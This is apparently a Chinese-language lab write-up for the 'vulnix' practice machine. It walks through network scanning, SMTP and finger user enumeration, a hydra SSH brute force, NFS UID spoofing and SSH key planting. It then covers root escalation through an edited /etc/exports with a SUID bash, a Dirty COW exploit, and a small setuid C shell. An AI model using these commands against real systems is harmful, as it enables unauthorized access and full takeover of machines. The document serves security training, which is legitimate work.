1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for 192.168.253.167 

2、nmap 192.168.253.167
22/tcp   open  ssh
25/tcp   open  smtp
79/tcp   open  finger
110/tcp  open  pop3
111/tcp  open  rpcbind
143/tcp  open  imap
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
993/tcp  open  imaps
995/tcp  open  pop3s
2049/tcp open  nfs

25（smtp）、79（finger）、111（rpcbind）
没有开启80端口，都是邮件、nfs挂在服务！


必须要理解NFS权限是如何工作的：

NFS 通常与 Kerberos 配对以实现强大的身份验证机制，因为 NFS 本身仅根据用户的 UID/GID 对用户进行身份验证；这比适当的身份验证系统（如 kerberos）是非常不安全的。

一旦NFS文件系统被远程主机以读/写权限成功挂载，每个共享文件的唯一保护就是它的权限。此权限绑定到用户的用户 ID。如果共享相同用户ID的两个用户挂载相同的 NFS 文件系统，可以修改彼此的文件。这是NFS的一项功能，UID/GUID或用户名/组名用于识别和验证客户端；鉴于服务器没有Kerberos设置。

由于目标没有 Kerberos 设置，因此只需找到经过身份验证以使用NFS的用户的UID和GUID（很可能是名为 的用户vulnix），并创建具有相同UID和GUID的用户。

但是没有目标中任何用户的UID或GID。这意味着目前无法访问 NFS 共享，即使挂载了该共享。


3、SMTP信息枚举（25端口）
SMTP是安全测试中比较常见的服务类型，其不安全的配置（未禁用某些命令）会导致用户枚举的问题，这主要是通过SMTP命令进行的。
参考：https://blog.csdn.net/weixin_30588907/article/details/94955805

smtp-user-enum是使用Perl编写的工具，其原理就是通过命令枚举用户账户！
apt install smtp-user-enum   ---安装枚举工具

smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.253.16
-M    ---用于猜测用户名 EXPN、VRFY 或 RCPT 的方法（默认值：VRFY）
-U    ---通过 smtp 服务检查的用户名文件
-t    ---host 服务器主机运行 smtp 服务

192.168.253.167: root exists
192.168.253.167: user exists

4、finger信息枚举

finger命令用于查找并显示用户信息。包括本地与远端主机的用户皆可,帐号名称没有大小写的差别。
finger root@192.168.253.167
Login: root           			Name: root
Directory: /root                    	Shell: /bin/bash

finger user@192.168.253.167
Login: user           			Name: user
Directory: /home/user               	Shell: /bin/bash

Login: dovenull       			Name: Dovecot login user
Directory: /nonexistent             	Shell: /bin/false

看到两个用户都是有效的，用户user具有devenull的登录名和名为Dovecot的名称，这边只确认了用户的存在，密码还需要继续获得！
Dovecot是一个开源电子邮件服务器。


5、NFS信息枚举（2049/tcp open  nfs）
将在端口2049上进行NFS枚举！

showmount -e 192.168.253.167
Export list for 192.168.253.167:
/home/vulnix *
可看到vulnix安装文件夹进行共享，将远程共享文件装在本地kali上。

mkdir nfs   ---创建个挂载目录
mount -t nfs 192.168.253.167:/home/vulnix /root/Desktop/21/nfs   ---挂载vulnix目录
cd nfs 
cd: 权限不够: nfs
可以看出其实共享已经实现，估计设置了root_squash标志，只是不允许我们去访问，只允许vulnix用户去访问
目前只允许vulnix用户登陆，并且得具有与目标上相同的id和gid！

6、九头蛇爆破

hydra -l user -P /root/Desktop/rockyou.txt 192.168.253.167 ssh -t 4
[STATUS] 29.33 tries/min, 440 tries in 00:15h, 14343959 to do in 8149:59h, 4 active
[22][ssh] host: 192.168.253.167   login: user   password: letmein
账号：user
密码：letmein

7、内网挂载
ssh user@192.168.253.167
letmein

cat /etc/passwd
登录发现vulnix权限为2008！

useradd -u 2008 vulnix
mount -t nfs 192.168.253.168:/home/vulnix /tmp/nfs
su vulnix
cd /tmp/mnt
ls -la
可以访问了，直接ssh-keygen生成key进行！


8、ssh密匙技巧

ssh-keygen  ---全部回车
cd /root/.ssh 
cat id_rsa.pub   ---里面的值复制

在mnt目录下创建：mkdir .ssh   cd .ssh  进去后写入：
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXPWdo6wEHk9to1eiVdpP2dM1KiUtkj09yWTi0AQMRy3xumvVJfHm+UEZu1VBL1IhYTYZI0bim3PTIS0K0txDIP7wqLX2QzDN6jwYuW3tEBSLIQxe+9bAyeAK24N/Ko5i9FK0kGLlXVzm4eqhSOVgTb4ImvPgEHvdkGxtmujMil49NOnOHxJdrXyNNbxdLA1JK0qNHp9DTDmDsohi6FzaauwlEVzFNQNeRARxVBSJ4DG3zTmLJduCghEGrMhpR1p3tt4rsPn9lBGX2+boNE2ZjsefEHlPS/3iBvcPJlrpfNrwgb9ohdio3eKpwf8KOmjPC1RthDDuvtS+bKNUKRxKn9xWJgUtjAnD4jloRMWdNq4WyM2nRcVJ9AQNcH5jPeALRFWlHz45Jd5XP8KJPwyx3qXuhRdtgYFsaHImRfS4mDwr5SZ6eUikcp7e1cTq15oQZnrna+YFxZCbATSwhsfx9mCbE8SwO3TtibEoserx88HMVfK4XdaJOnsf8HlC3Co0= root@zc ' >  authorized_keys

echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILFyryihZPakuw2OS8Ves93TrPVbM/5Ci1/XhlGyvWsp root@kali  ' >  authorized_keys

ssh vulnix@192.168.253.168    ---成功登录

9、提权
-------------------------------------------------------
方法一：

sudo -l
ser vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports

看到sudo提权，可以以root用户身份执行sudoedit /etc/exports，编辑/etc/exports该文件

root_squash： 客户端的root用户映射到任何人：客户端无法使用setuid位将恶意软件留给他人执行。
no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）


cat /etc/exports
/home/vulnix	*(rw,root_squash)

sudoedit /etc/exports  ---root权限编辑
通过用no_root_squash替换root_squash来实现！
修改以后要重新启动才生效 并重新挂载
危害：
如果no_root_squash使用，远程 root 用户可以更改共享文件系统上的任何文件，并留下被木马感染的应用程序，让其他用户无意中执行。


回到kali输入：df
192.168.253.167:/home/vulnix   792064   714368    38016   95% /tmp/mnt
修改好后down掉挂载：umount /tmp/nfs   ---全部挂载删除

mount -t nfs 192.168.253.168:/home/vulnix /tmp/nfs  ---重新在挂在到nfs新目录下

1）在vulnix
ssh vulnix@192.168.253.167
cp /bin/bash .

2）在kali执行
cat bash > dayu
chmod 4777 dayu
本地计算机的/bin/bash复制到/tmp/nfs并赋权
./bash -p   ---保留原始的shell权限
id
成功获得root权限！

-p  ---打开特权模式。在此模式下，不处理$ENV和$BASH_ENV文件，不从环境继承shell函数，并且如果 SHELLOPTS、BASHOPTS、CDPATH和GLOBIGNORE变量出现在环境中，它们将被忽略，如果shell不等于真实用户（组）id的有效用户（组）id就会启动，并且没有提供-p选项则执行这些操作并将有效用户id设置为真实用户ID。如果在启动时提供了-p选项，则不会重置有效的用户ID。关闭此选项会导致有效用户和组ID设置为真实用户和组ID。

-------------------------------------------------------
方法二：
sudoedit /etc/exports这个地方修改为/root
然后保存重启环境！
showmount -e 192.168.253.167
然后在挂在进入root目录就行！


方法三：此环境需要32位同环境操作！
dirty_cow：40839
cp /usr/share/exploitdb/exploits/linux/local/40839.c .
gcc 40839.c -lcrypt -pthread -o exp
python -m SimpleHTTPServer 8081
wget http://192.168.253.138:8081/exp
chmod +x exp
./exp   ---它会要求输入任何密码!
此脚本会将root用户典当为firefart用户!以firefart用户身份使用ssh登录：
ssh firefart@192.168.253.167
打开/etc/passwd文件
将firefart更改为root
在以root登录
ssh root@192.168.253.167



--------------------------------------------------
拓展小技巧：
方法1：smtp群体枚举
1）MSF枚举
msfconsole
search smtp 
use auxiliary/scanner/smtp/smtp_enum
set rhosts 192.168.253.167
run

git clone https://github.com/Kan1shka9/Finger-User-Enumeration.git
cd Finger-User-Enumeration  
然后该下sh文件IP：
./finger_enum_user.sh user.txt


2）方法2：服务rpcbind已打开RPC枚举
rpcinfo -p 192.168.253.167


3）写shell技巧：C

---
#include <stdlib.h>

int main() { setuid(0); setgid(0); system("/bin/sh"); }

---
nano写入shell.c文件
gcc shell.c -o shell
chmod 4777 shell
./shell








知识点总结：
1）通过telnet连接收集用户名敏感信息
2）finger查看用户登录信息
3）使用rpcinfo进行RPC枚举
4）使用showmount进行NFS枚举
5）hydra爆破ssh密码
6）ssh-key毒化攻击getshell
7）特定linux UID权限用户登录挂载的NFS分区
8）使用ssh私匙登录ssh
9）用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）
10）客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权




# mynew

smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t ==smtp枚举

finger查看用户登录信息

使用rpcinfo进行RPC枚举
rpcinfo -p 10.0.0.1

使用showmount进行NFS枚举

## 特定linux UID权限用户登录挂载的NFS分区

## ssh-key毒化攻击getshell
kali  ssh-keygen  ---全部回车cd /root/.ssh  cat id_rsa.pub   ---里面的值复制到a
被连接的：==进入用户目录== mkdir .ssh   cd .ssh  进去后写入：
echo '复制的值a' > authorized_keys

## 用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）
需要sudo权限重新启动被攻击的机器且重新挂载
## 客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权


























































